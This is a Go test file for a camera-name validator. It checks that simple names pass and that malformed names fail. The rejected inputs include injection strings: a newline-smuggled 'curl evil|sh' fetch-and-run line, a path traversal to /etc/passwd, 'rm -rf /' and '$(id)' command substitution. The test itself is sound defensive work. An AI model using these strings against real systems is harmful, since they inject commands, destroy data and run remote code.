package models

import "testing"

func TestIsValidCameraName(t *testing.T) {
	valid := []string{"salon", "cam-01", "gatos.cocina", "Front_Door"}
	for _, n := range valid {
		if !IsValidCameraName(n) {
			t.Errorf("expected %q to be valid", n)
		}
	}

	invalid := []string{
		"",
		"a",
		"con espacio",
		"x\non_event_start curl evil|sh",
		"../../etc/passwd",
		"a/b",
		"cam;rm -rf /",
		"$(id)",
		"nombre-larguisimo-que-supera-el-limite-de-cuarenta-y-ocho",
	}
	for _, n := range invalid {
		if IsValidCameraName(n) {
			t.Errorf("expected %q to be invalid", n)
		}
	}
}
